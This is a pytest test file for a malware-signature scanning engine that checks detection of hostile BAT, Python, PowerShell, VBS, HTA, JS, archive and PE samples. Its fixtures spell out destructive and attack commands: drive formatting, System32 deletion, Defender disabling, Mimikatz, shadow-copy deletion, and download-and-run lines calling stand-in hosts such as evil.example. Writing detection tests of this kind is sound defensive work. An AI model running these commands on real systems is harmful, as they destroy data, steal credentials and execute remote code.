"""Движок: сигнатуры по расширениям, PE, архивы, безопасность имён."""

from __future__ import annotations

import io
import zipfile

import pytest

from xsafety.scan.engine import ScanError, extension_from, sanitize_filename, scan_bytes
from xsafety.scan.pe import parse_pe
from xsafety.scan.textutil import decode_text
from xsafety.scan.types import Severity

from tests.pe_builder import build_pe


def ids(result) -> set[str]:
    return {finding.sig_id for finding in result.findings}


def test_sanitize_filename_removes_paths_and_controls():
    assert sanitize_filename("../../etc/passwd") == "passwd"
    assert sanitize_filename("C:\\Windows\\evil.bat") == "evil.bat"
    assert sanitize_filename("bad\x00name\x1f.py") == "badname.py"
    with pytest.raises(ScanError):
        sanitize_filename("")


def test_extension_parsing():
    assert extension_from("file.BAT") == "bat"
    assert extension_from("archive.tar.gz") == "gz"
    assert extension_from("noext") == ""
    assert extension_from("bad.$$$") == ""


def test_model_rejects_foreign_extension():
    with pytest.raises(ScanError) as error:
        scan_bytes("tool.exe", b"MZ" + b"\x00" * 64, "m1")
    assert error.value.code == "extension_not_allowed"
    assert error.value.status == 403


def test_bat_signatures():
    payload = (
        b"@echo off\n"
        b"format C: /q\n"
        b"del /f /s /q C:\\Windows\\System32\n"
        b"reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v x /d y\n"
        b"powershell.exe -WindowStyle Hidden -enc " + b"A" * 64 + b"\n"
    )
    result = scan_bytes("danger.bat", payload, "m1")
    assert result.verdict == "malicious"
    assert result.worst.rank >= Severity.HIGH.rank
    assert {"bat.format_drive", "bat.mass_delete", "bat.registry_run", "bat.powershell_encoded"} <= ids(result)


def test_python_signatures():
    payload = (
        b"import os, base64, requests\n"
        b"os.system('whoami')\n"
        b"exec(base64.b64decode('cHJpbnQoMSk='))\n"
        b"requests.post('https://discord.com/api/webhooks/1/abc', json={})\n"
    )
    result = scan_bytes("dropper.py", payload, "m1")
    assert {"py.os_system", "py.exec_encoded", "py.requests_webhook"} <= ids(result)
    assert result.verdict == "malicious"


def test_javascript_and_hta():
    js = b"eval(atob('YWxlcnQoMSk=')); new ActiveXObject('WScript.Shell');"
    result = scan_bytes("x.js", js, "m2")
    assert "js.eval_atob" in ids(result)

    hta = (
        b'<html><script src="https://evil.example/payload.js"></script>'
        b'<script>new ActiveXObject("WScript.Shell").Run("cmd.exe")</script></html>'
    )
    result = scan_bytes("invoice.hta", hta, "m3_lite")
    assert "hta.remote_script" in ids(result)
    assert "js.activexobject" in ids(result)


def test_powershell_signatures():
    payload = (
        b"IEX (New-Object Net.WebClient).DownloadString('http://evil/x.ps1')\n"
        b"Invoke-Mimikatz -DumpCreds\n"
        b"Set-MpPreference -DisableRealtimeMonitoring $true\n"
    )
    result = scan_bytes("payload.ps1", payload, "m3_pro")
    assert {"ps.downloadstring", "ps.mimikatz", "ps.defender_disable"} <= ids(result)


def test_vbs_signatures():
    payload = (
        b'Set http = CreateObject("MSXML2.XMLHTTP")\n'
        b'Set stream = CreateObject("ADODB.Stream")\n'
        b'stream.SaveToFile "dropper.exe", 2\n'
        b'CreateObject("WScript.Shell").Run "dropper.exe"\n'
    )
    result = scan_bytes("run.vbs", payload, "m3_lite")
    assert "vbs.download_exec" in ids(result)


def test_zip_traversal_and_double_extension():
    buffer = io.BytesIO()
    with zipfile.ZipFile(buffer, "w") as archive:
        archive.writestr("../../etc/passwd", "x")
        archive.writestr("invoice.pdf.exe", b"MZ")
    result = scan_bytes("archive.zip", buffer.getvalue(), "m3_lite")
    assert {"zip.path_traversal", "zip.double_extension"} <= ids(result)
    assert result.verdict == "malicious"


def test_zip_bomb_skipped():
    buffer = io.BytesIO()
    with zipfile.ZipFile(buffer, "w", zipfile.ZIP_DEFLATED) as archive:
        archive.writestr("bomb.txt", b"\x00" * (2 * 1024 * 1024))
    result = scan_bytes("bomb.zip", buffer.getvalue(), "m3_lite")
    assert "zip.compression_bomb" in ids(result)


def test_nested_zip_is_scanned():
    inner = io.BytesIO()
    with zipfile.ZipFile(inner, "w", zipfile.ZIP_DEFLATED) as archive:
        archive.writestr("payload.ps1", b"IEX (New-Object Net.WebClient).DownloadString('http://x/y')")
    outer = io.BytesIO()
    with zipfile.ZipFile(outer, "w", zipfile.ZIP_DEFLATED) as archive:
        archive.writestr("inner.zip", inner.getvalue())
    result = scan_bytes("outer.zip", outer.getvalue(), "m3_lite")
    assert "ps.downloadstring" in ids(result)


def test_pe_imports_and_injection():
    data = build_pe(dll=True)
    info = parse_pe(data)
    assert info is not None
    assert info.is_dll is True
    assert info.is_64 is True
    assert "VirtualAllocEx" in info.imports
    assert "kernel32.dll" in info.libraries

    result = scan_bytes("evil.dll", data, "m3_lite")
    assert "dll.injection_api" in ids(result)
    assert result.verdict == "malicious"


def test_pe_rwx_section_detected():
    data = build_pe(dll=False, rwx=True, import_functions=("GetProcAddress",))
    result = scan_bytes("packed.exe", data, "m3_pro")
    assert "exe.rwx_section" in ids(result)


def test_invalid_pe_flagged():
    result = scan_bytes("fake.dll", b"not a real dll", "m3_lite")
    assert "dll.invalid_pe" in ids(result)


def test_jar_analysis():
    buffer = io.BytesIO()
    with zipfile.ZipFile(buffer, "w") as archive:
        archive.writestr("META-INF/MANIFEST.MF", "Manifest-Version: 1.0\nMain-Class: com.evil.Main\n")
        archive.writestr("com/evil/Main.class", b"\xca\xfe\xba\xbejava/lang/RuntimegetRuntimeexec\x00")
        archive.writestr("payload.exe", b"MZ" + b"\x00" * 32)
    result = scan_bytes("app.jar", buffer.getvalue(), "m3_pro")
    assert {"jar.main_class", "jar.unsigned", "jar.runtime_exec", "jar.embedded_executable"} <= ids(result)


def test_eicar_and_secrets():
    eicar = b"X5O!P%@AP[4\\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*"
    result = scan_bytes("eicar.py", eicar, "m1")
    assert "common.eicar" in ids(result)
    assert result.verdict == "malicious"

    secrets = (
        b"-----BEGIN RSA PRIVATE KEY-----\n"
        b"AKIAABCDEFGHIJKLMNOP\n"
        b"ghp_" + b"a" * 36
    )
    result = scan_bytes("keys.py", secrets, "m1")
    assert {"common.private_key", "common.aws_key", "common.github_token"} <= ids(result)


def test_clean_file_has_no_findings():
    result = scan_bytes("hello.bat", b"@echo off\r\necho hello\r\npause\r\n", "m1")
    assert result.verdict == "clean"
    assert result.findings == []


def test_findings_are_bounded_and_deduplicated():
    payload = ("vssadmin delete shadows /all\n" * 500).encode()
    result = scan_bytes("many.bat", payload, "m1")
    assert len(result.findings) <= 3
    assert len({(f.sig_id, f.evidence) for f in result.findings}) == len(result.findings)


def test_decode_text_supports_utf16_and_cp1251():
    assert "Привет" in decode_text("Привет".encode("utf-16"))
    assert "Привет" in decode_text("Привет".encode("cp1251"))
    assert "Привет" in decode_text("Привет".encode("utf-8"))
